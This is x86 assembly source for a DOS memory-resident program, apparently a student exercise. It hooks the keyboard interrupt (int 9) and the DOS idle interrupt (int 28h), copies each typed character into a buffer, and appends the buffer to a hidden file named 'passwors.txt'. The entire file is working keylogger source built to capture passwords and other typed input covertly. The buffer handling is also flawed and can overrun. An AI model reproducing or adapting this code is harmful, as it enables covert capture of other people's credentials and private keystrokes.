locals @@
.model tiny
.186

;extrn Draw_Shadow_Rect:proc

.code
org 100h

Start:

jmp Next
;---------------------------------DEFINES--------------------------------
GRAPHIC_PTR equ 0b800h
LETTER_STYLE equ 204eh
X_POINT equ 20
Y_POINT equ 8
LENGTH equ 30
HEIGHT equ 12
HOT_KEY equ 39h				;Space
MID equ (80 * 14 + 38) * 2 

buff_l dw 0
buff_r dw 0

Text: db "ANANAS", 0
Tittle: db "DRAGON X", 0
File_Name: db "W:\ASM_PROG\TEMP_KEY\passwors.txt", 0
handler dw ?

buffer db 257 dup (0)
int9_vect equ 36
int28_vect equ 4d * 28d
;------------------------------------------------------------------------

Next:
	xor ax, ax		;ax = 0
	mov es, ax		;es = 0

	mov word ptr buff_l, offset buffer
	mov word ptr buff_r, offset buffer

	cli

	mov ax, word ptr es:[int9_vect]		; first two bytes of interuprion
	mov inter09, ax
	mov ax, word ptr es:[int9_vect + 2]	; second two bytes
	mov inter09 + 2, ax

	mov ax, word ptr es:[int28_vect]		
	mov inter28, ax
	mov ax, word ptr es:[int28_vect + 2]	
	mov inter28 + 2, ax


	mov word ptr es:[int9_vect], offset New09	; put the adress of the new handler 
	mov word ptr es:[int28_vect], offset New28

	mov ax, cs
	mov word ptr es:[int9_vect+2], ax
	mov word ptr es:[int28_vect+2], ax
	sti

	mov ax, 3100h					;31th function in ah
	mov dx, offset EndLabel			;memory size to keep resident
	shr dx, 4						;in 16-byte paragraphs
	inc dx
	int 21h

	inter09 dw 0
		 dw 0

	inter28 dw 0
		 dw 0


New09 proc

	push ax bx cx dx es ds si di bp

	mov ax, cs
	mov es, ax

	in al, 60h						;put value of the 60th port into al


;	push ax bx cx dx es ds si di bp

	pushf
	call dword ptr cs:[inter09]

;	pop bp di si ds es dx cx bx ax

	mov ah, 01h
	int 16h

COMMENT * This is ASCII-code
	mov bx, GRAPHIC_PTR
	mov es, bx
	mov byte ptr es:[MID + 2], al
*

	call Write_Buff

COMMENT & This is buffer print
	mov ax, cs
	mov ds, ax
	mov al, 4eh
	mov si, offset cs:buffer
	mov bl, 30
	mov bh, 4
	call Printf
&
	pop bp di si ds es dx cx bx ax

	iret
	;ret
	endp


New28 proc

push ax bx cx dx es di si

mov ax, word ptr cs:buff_r
sub ax, cs:buff_l
cmp ax, 0
jbe @@Next

call Write_File

@@Next:
pop si di es dx cx bx ax


pushf
call dword ptr cs:[inter28]

iret
endp


;-----------------------------------------WRITE_BUFF------------------------
; Puts a symbol into buffer.			
;			Input: 
;					AL - symbol to write into the buffer
;			Destr:  
;					AL, BX
;-----------------------------------------------------------------------------

	Write_Buff proc

	mov bx, word ptr cs:buff_r
	cmp al, 79h
	ja @@Next
	cmp al, 0
	je @@Next
	mov byte ptr cs:[bx], al

	inc bx
	mov word ptr cs:buff_r, bx

@@Next:

	ret
	endp

;-----------------------------------------WRITE_FILE------------------------
;		Input: File_Name - file name
;		Destr: AX, BX, CX, DX
;------------------------------------------------------------------------------

Write_File proc

		push ax bx cx dx si di ds es

		mov ax, 0b800h
		mov es, ax

		mov ax, cs
		mov ds, ax

		mov ax, 3d01h
		mov dx, offset File_Name
		int 21h

		mov handler, ax 				;handler
		mov bx, ax

		mov bx, word ptr handler
		mov ax, 4202h					;move pointer to the end of the file
		xor cx, cx
		xor dx, dx
		int 21h							;position of the end of the file is in AX
	
		mov dx, cs
		mov ds, dx
		mov dx, cs:buff_l
		mov cx, cs:buff_r
		sub cx, cs:buff_l								;cx = length
		mov ah, 40h									;write to file
		int 21h


		mov bx, word ptr handler
		mov ah, 3eh					;close file
		int 21h

		mov ax, cs:buff_r
		mov cs:buff_l, ax

		pop es ds di si dx cx bx ax
ret
endp

;-------------------------------------------------------------------------
;++++++++++++++++++++++++++++++++++++++++PRINTF+++++++++++++++++++++++++++++++++
;	Draws a message in point (start_x, start_y). Inserts symbols with a particular ;color. 
;		Entry:	
;				ES - video memory
;				DS - segment with the string
;				AL - color
;				BL - start_x
;				BH - start_y
;				SI - pointer to the text
;		Destr:  DX, DI, BX, SI
;+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++

		Printf proc

			mov dx, ax
			mov al, 80
			mul bh
			add al, bl
			shl ax, 1
			mov di, ax  
			mov ax, dx

		push di si
		xor bx, bx
		@@Cycle:
		mov bx, ds:[si]
		cmp bl, 0
		je @@Exit
		movsb
		mov byte ptr es:[di], al
		inc di
		jmp @@Cycle

		@@Exit:
		pop si di
		ret
		endp

;-----------------------------STRLEN------------------------------
;The program returns the length of the string up to symbol '\0'
;
;		Entry:	DS - segment with a string
;				DI - pointer to the string in the segment
;		
;		Return value:
; Returns value in AX: length of the string
;
;-----------------------------------------------------------------

strlen proc

push di
mov ax, 0
@@Cycle:
cmp byte ptr ds:[di], 0
je @@End
inc di
inc ax
jmp @@Cycle

@@End:
pop di
ret
endp
;-------------------------------------------------------------------

	EndLabel:
	end Start